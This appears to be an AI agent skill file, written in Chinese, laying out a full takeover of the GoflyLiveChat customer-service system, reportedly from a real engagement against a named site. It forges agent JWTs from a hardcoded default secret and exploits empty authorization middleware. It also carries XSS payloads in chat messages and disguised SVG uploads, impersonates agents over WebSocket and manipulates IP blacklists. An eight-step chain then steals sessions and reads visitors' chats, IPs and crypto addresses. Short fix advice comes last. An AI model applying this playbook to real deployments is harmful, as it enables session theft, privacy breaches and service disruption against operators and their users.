---
name: gofly-livechat-takeover
description: GoflyLiveChat客服系统JWT硬编码密钥接管：硬编码JWT secret→伪造客服token→接管所有会话→WebSocket ws_kefu伪装客服→DOM XSS via v-html消息渲染
---
# GoflyLiveChat JWT 硬编码密钥 → 客服系统完全接管

> 来源：margins.one 实战（2026-09-21），Go + gin + JWT + WebSocket
> 适用：目标使用 GoflyLiveChat 开源客服系统

## 指纹识别

- 客服入口 URL 含 `chat.` 子域或 `/kefu/` 路径
- WS 端点 `ws_kefu?token=` / `ws_visitor`
- 响应头含 gin 框架特征
- 路径 `/visitors` `/messages` `/kefu/message` `/register` `/ipblack`
- 前端有 `v-html` 渲染消息内容的 Vue 组件

## 漏洞链

### V1 · JWT SECRET 硬编码（严重）
```go
// tools/jwt.go — 开源项目默认密钥
var jwtKey = []byte("your-secret-key-here")  // 或项目默认值
```
- 从 GitHub `goflylivechat` 仓库直接读取默认密钥
- 伪造任意 `kefu_id` 的 JWT

### V2 · RbacAuth 权限中间件为空函数（严重）
```go
func RbacAuth() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Next()  // 直接放行
    }
}
```
- 所有管理端点实质无权限校验

### V3 · /messages 免认证（高）
```
GET /messages?visitorId=<uuid>    → 该游客全部聊天记录（免认证）
GET /visitors                     → 全部游客 IP/城市/refer（需 token）
```

### V4 · 存储型 DOM XSS（严重）
```html
<!-- 前端 Vue 组件 -->
<div class="chatContent" v-html="v.content">
```
```
POST /kefu/message {to_id, content: "<img src=x onerror=alert(1)>"}
→ 原样入库未转义 → 客服加载会话时触发 DOM XSS
```

### V5 · SVG/HTML 伪装上传 XSS（高）
```
POST /uploadimg
Content-Type: image/png
文件内容: <svg onload=alert(1)><script>...</script></svg>
命名: evil.png
```
- 仅校验扩展名不校验内容
- 无 `X-Content-Type-Options: nosniff`

### V6 · WS 伪客服在线 + 踢真客服（高）
```
wss://chat.target.com/ws_kefu?token=<伪造JWT>
→ 101 握手成功 → 收实时推送
→ 同名重复连接把真客服踢下线（DoS）
```

### V7 · IP 黑名单操控（中）
```
POST /ipblack {ip: "1.2.3.4"} → 拉黑任意玩家 IP
DELETE /ipblack?ip=1.2.3.4    → 删除黑名单
```

## 完整利用链
```
1. GitHub 获取 JWT 默认密钥
2. 伪造 kefu_id=1 的 JWT
3. WS 连接以客服身份上线（踢真客服）
4. POST /kefu/message 发送 XSS payload（冒充客服）
5. 玩家打开聊天 → DOM XSS 触发 → 窃取会话
6. GET /visitors 枚举全部游客 IP/地理
7. GET /messages 读取全部历史聊天（含转账截图/TRON地址）
8. POST /ipblack 封禁目标 IP
```

## 修复建议
1. JWT 密钥必须从环境变量/密钥管理读取，禁止硬编码
2. 恢复 RbacAuth 权限校验
3. `/messages` 接口加认证
4. `v-html` 改为 `v-text` 或 DOMPurify 过滤
5. 上传文件校验 magic bytes 而非扩展名
6. 添加 `X-Content-Type-Options: nosniff`
7. WS 连接加设备指纹绑定
